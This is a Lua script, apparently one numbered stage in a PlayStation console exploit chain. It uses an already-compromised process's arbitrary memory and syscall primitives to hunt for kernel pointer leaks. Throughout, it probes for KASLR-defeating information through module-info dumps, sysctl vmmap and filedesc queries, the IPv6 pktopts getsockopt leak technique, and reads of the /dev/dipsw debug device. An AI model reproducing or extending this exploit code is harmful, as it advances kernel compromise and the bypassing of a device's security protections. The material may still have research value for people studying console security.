-- CRASH_CLASS: LOW
-- PROBE 143o: Use loader's fcall infrastructure for KASLR defeat
--
-- Context: 143n proved syscall.getpid()/getuid() work through fcall.
-- fcall(addr, rax) returns a callable. All loader primitives are live.
-- Use them to hunt for kernel address leaks.

print("=== PROBE 143o: FCALL KASLR HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

--------------------------------------------------------------------
-- [A] Verify fcall works + key addresses
--------------------------------------------------------------------
print("--- [A] Setup ---")
local pid = syscall.getpid()
print("[A] pid=" .. tostring(pid))
print("[A] eboot=" .. hex(eboot_base))
print("[A] libc=" .. hex(libc_base))
print("[A] libkernel=" .. hex(libkernel_base))
print("[A] sc_addr=" .. hex(syscall.syscall_address))

--------------------------------------------------------------------
-- [B] sceKernelGetModuleInfoFromAddr — full module dump
-- This function is in libc, called through the GOT
--------------------------------------------------------------------
print("")
print("--- [B] sceKernelGetModuleInfoFromAddr ---")

if libc_addrofs and libc_addrofs.sceKernelGetModuleInfoFromAddr then
    local get_modinfo = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
    print("[B] get_modinfo type=" .. type(get_modinfo))

    -- Call with libkernel_base to get its module info
    local mod_info = memory.alloc(0x200)
    memory.write_dword(mod_info, 0x160)  -- size field

    local ok, rv = pcall(function()
        return get_modinfo(libkernel_base, uint64(1), mod_info)
    end)

    if ok then
        print("[B] ret=" .. tostring(rv))
        local rv_num = to_num(rv)
        if rv_num == 0 then
            print("[B] SUCCESS — dumping module info")
            -- Scan for kernel pointers in the output
            for off = 0, 0x158, 8 do
                local q = memory.read_qword(mod_info + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h ~= 0 or l ~= 0 then
                        local marker = ""
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            marker = " *** KERNEL PTR ***"
                        end
                        print("[B] +" .. string.format("%03X", off) .. "=" .. hex(q) .. marker)
                    end
                end
            end
        else
            print("[B] returned " .. rv_num .. " (error)")
        end
    else
        print("[B] FAIL: " .. tostring(rv))
    end
end

--------------------------------------------------------------------
-- [C] Try sysctl queries using the loader's sysctl_name2oid
--------------------------------------------------------------------
print("")
print("--- [C] Sysctl queries ---")

-- kern.proc.pathname.-1 (our binary path)
if sysctl_name2oid then
    print("[C] sysctl_name2oid exists!")

    -- Try kern.osreldate
    local ok1, oid1 = pcall(function()
        return sysctl_name2oid("kern.osreldate")
    end)
    if ok1 then
        print("[C] kern.osreldate oid=" .. tostring(oid1))
        -- Try reading it
        if oid1 then
            local ok_sv, sv = pcall(function()
                return syscall.sysctl(oid1, uint64(2), memory.alloc(8), memory.alloc(8), uint64(0), uint64(0))
            end)
            print("[C] sysctl ret=" .. tostring(sv))
        end
    else
        print("[C] name2oid fail: " .. tostring(oid1))
    end
else
    print("[C] sysctl_name2oid not available, using raw sysctl")

    -- Raw sysctl: kern.osreldate = {1, 24}
    local mib = memory.alloc(16)
    memory.write_dword(mib, 1)       -- CTL_KERN
    memory.write_dword(mib + 4, 24)  -- KERN_OSRELDATE
    local outbuf = memory.alloc(16)
    local oldlenp = memory.alloc(8)
    memory.write_qword(oldlenp, uint64(8))

    local ok_s, rv_s = pcall(function()
        return syscall.sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
    end)
    if ok_s then
        print("[C] sysctl ret=" .. tostring(rv_s))
        local rv_num = to_num(rv_s)
        if rv_num == 0 then
            local val = memory.read_dword(outbuf)
            print("[C] kern.osreldate=" .. tostring(val))
        end
    else
        print("[C] sysctl FAIL: " .. tostring(rv_s))
    end
end

--------------------------------------------------------------------
-- [D] Try sysctl kern.proc.vmmap (self)
-- This might give us a kernel pointer on some FreeBSD versions
--------------------------------------------------------------------
print("")
print("--- [D] kern.proc.vmmap ---")

local pid_num = to_num(pid)
local mib = memory.alloc(24)
memory.write_dword(mib, 1)        -- CTL_KERN
memory.write_dword(mib + 4, 14)   -- KERN_PROC
memory.write_dword(mib + 8, 35)   -- KERN_PROC_VMMAP
memory.write_dword(mib + 12, pid_num)
local oldlenp = memory.alloc(8)
memory.write_qword(oldlenp, uint64(0))

-- First query: get size needed
local ok_vm, rv_vm = pcall(function()
    return syscall.sysctl(uint64(mib), uint64(4), uint64(0), uint64(oldlenp), uint64(0), uint64(0))
end)

if ok_vm then
    local rv_n = to_num(rv_vm)
    print("[D] vmmap size query ret=" .. rv_n)
    if rv_n == 0 then
        local needed = to_num(memory.read_qword(oldlenp))
        print("[D] size needed=" .. needed)

        if needed > 0 and needed < 0x100000 then
            local outbuf = memory.alloc(math.min(needed, 0x40000))
            memory.write_qword(oldlenp, uint64(math.min(needed, 0x40000)))

            local ok_vm2, rv_vm2 = pcall(function()
                return syscall.sysctl(uint64(mib), uint64(4), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
            end)

            if ok_vm2 and to_num(rv_vm2) == 0 then
                local got = to_num(memory.read_qword(oldlenp))
                print("[D] vmmap got " .. got .. " bytes")

                -- Scan for kernel pointers
                local kptr_count = 0
                for off = 0, math.min(got - 8, 0x3FFF8), 8 do
                    local q = memory.read_qword(outbuf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            kptr_count = kptr_count + 1
                            if kptr_count <= 5 then
                                print("[D] KPTR at +" .. string.format("%X", off) .. "=" .. hex(q))
                            end
                        end
                    end
                end
                print("[D] total kernel ptrs: " .. kptr_count)
            else
                print("[D] vmmap read ret=" .. tostring(rv_vm2))
            end
        end
    else
        print("[D] vmmap blocked (ret=" .. rv_n .. ")")
    end
else
    print("[D] vmmap FAIL: " .. tostring(rv_vm))
end

--------------------------------------------------------------------
-- [E] Try sysctl kern.proc.filedesc (self)
--------------------------------------------------------------------
print("")
print("--- [E] kern.proc.filedesc ---")

memory.write_dword(mib + 8, 33)   -- KERN_PROC_FILEDESC
memory.write_qword(oldlenp, uint64(0))

local ok_fd, rv_fd = pcall(function()
    return syscall.sysctl(uint64(mib), uint64(4), uint64(0), uint64(oldlenp), uint64(0), uint64(0))
end)

if ok_fd then
    local rv_n = to_num(rv_fd)
    print("[E] filedesc size ret=" .. rv_n)
    if rv_n == 0 then
        local needed = to_num(memory.read_qword(oldlenp))
        print("[E] size needed=" .. needed)

        if needed > 0 and needed < 0x100000 then
            local outbuf = memory.alloc(math.min(needed, 0x40000))
            memory.write_qword(oldlenp, uint64(math.min(needed, 0x40000)))

            local ok_fd2, rv_fd2 = pcall(function()
                return syscall.sysctl(uint64(mib), uint64(4), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
            end)

            if ok_fd2 and to_num(rv_fd2) == 0 then
                local got = to_num(memory.read_qword(oldlenp))
                print("[E] filedesc got " .. got .. " bytes")

                local kptr_count = 0
                for off = 0, math.min(got - 8, 0x3FFF8), 8 do
                    local q = memory.read_qword(outbuf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            kptr_count = kptr_count + 1
                            if kptr_count <= 5 then
                                print("[E] KPTR at +" .. string.format("%X", off) .. "=" .. hex(q))
                            end
                        end
                    end
                end
                print("[E] total kernel ptrs: " .. kptr_count)
            else
                print("[E] filedesc read ret=" .. tostring(rv_fd2))
            end
        end
    else
        print("[E] filedesc blocked")
    end
else
    print("[E] FAIL: " .. tostring(rv_fd))
end

--------------------------------------------------------------------
-- [F] ipv6 socket + getsockopt for kernel leak
-- The classic PS4/PS5 technique — try to read pktopts
--------------------------------------------------------------------
print("")
print("--- [F] IPv6 socket pktopts leak ---")

-- Create IPv6 socket: socket(AF_INET6=28, SOCK_DGRAM=2, 0)
local sock_fn = fcall(syscall.syscall_address, 97)  -- socket
local ok_sock, sock_fd = pcall(function()
    return sock_fn(uint64(28), uint64(2), uint64(0))
end)

if ok_sock then
    local sock_num = to_num(sock_fd)
    print("[F] IPv6 UDP socket fd=" .. sock_num)

    if sock_num >= 0 then
        -- Set IPV6_PKTINFO (setsockopt)
        -- IPV6_PKTINFO = 46, IPPROTO_IPV6 = 41
        local optval = memory.alloc(8)
        memory.write_dword(optval, 1)

        local sso_fn = fcall(syscall.syscall_address, 105)  -- setsockopt
        local ok_sso, rv_sso = pcall(function()
            return sso_fn(uint64(sock_num), uint64(41), uint64(46), uint64(optval), uint64(4))
        end)
        print("[F] setsockopt(IPV6_PKTINFO) ret=" .. tostring(rv_sso))

        -- Also set IPV6_TCLASS (67)
        memory.write_dword(optval, 1)
        local ok_tc, rv_tc = pcall(function()
            return sso_fn(uint64(sock_num), uint64(41), uint64(67), uint64(optval), uint64(4))
        end)
        print("[F] setsockopt(IPV6_TCLASS) ret=" .. tostring(rv_tc))

        -- Now getsockopt to read back — check for leaked kernel data
        local gso_fn = fcall(syscall.syscall_address, 118)  -- getsockopt
        local optbuf = memory.alloc(0x100)
        local optlenp = memory.alloc(8)

        -- Try reading various options
        local opts = {
            {46, "IPV6_PKTINFO"},
            {67, "IPV6_TCLASS"},
            {50, "IPV6_CHECKSUM"},
            {61, "IPV6_USE_MIN_MTU"},
        }

        for _, opt in ipairs(opts) do
            for off = 0, 0xFF, 4 do memory.write_dword(optbuf + off, 0) end
            memory.write_qword(optlenp, uint64(0x100))

            local ok_g, rv_g = pcall(function()
                return gso_fn(uint64(sock_num), uint64(41), uint64(opt[1]), uint64(optbuf), uint64(optlenp))
            end)

            if ok_g and to_num(rv_g) == 0 then
                local gotlen = to_num(memory.read_qword(optlenp))
                print("[F] getsockopt(" .. opt[2] .. ") ret=0 len=" .. gotlen)

                -- Scan returned data for kernel pointers
                for off = 0, math.min(gotlen - 8, 0xF8), 8 do
                    local q = memory.read_qword(optbuf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            print("[F] !!! KPTR in " .. opt[2] .. " at +" .. off .. "=" .. hex(q))
                        end
                    end
                end
            end
        end

        -- Close socket
        local close_fn = fcall(syscall.syscall_address, 6)
        pcall(function() return close_fn(uint64(sock_num)) end)
    end
else
    print("[F] socket FAIL: " .. tostring(sock_fd))
end

--------------------------------------------------------------------
-- [G] Try to read /dev/dipsw (debug switches)
--------------------------------------------------------------------
print("")
print("--- [G] /dev/dipsw ---")

local open_fn = fcall(syscall.syscall_address, 5)  -- open
local read_fn = fcall(syscall.syscall_address, 3)
local close_fn2 = fcall(syscall.syscall_address, 6)

-- Try opening /dev/dipsw
local path_buf = memory.alloc(64)
local dipsw_path = "/dev/dipsw"
for i = 1, #dipsw_path do
    memory.write_byte(path_buf + i - 1, string.byte(dipsw_path, i))
end
memory.write_byte(path_buf + #dipsw_path, 0)

local ok_dp, dp_fd = pcall(function()
    return open_fn(uint64(path_buf), uint64(0))  -- O_RDONLY
end)

if ok_dp then
    local dp_num = to_num(dp_fd)
    print("[G] /dev/dipsw fd=" .. dp_num)
    if dp_num >= 0 then
        local rbuf = memory.alloc(256)
        local ok_dr, dr = pcall(function()
            return read_fn(uint64(dp_num), uint64(rbuf), uint64(256))
        end)
        print("[G] read ret=" .. tostring(dr))
        if ok_dr and to_num(dr) > 0 then
            local n = to_num(dr)
            print("[G] got " .. n .. " bytes")
            for off = 0, math.min(n-1, 31), 4 do
                print("[G] +" .. off .. "=" .. hex(memory.read_dword(rbuf + off)))
            end
        end
        pcall(function() return close_fn2(uint64(dp_num)) end)
    end
else
    print("[G] FAIL: " .. tostring(dp_fd))
end

print("")
print("=== PROBE 143o COMPLETE ===")
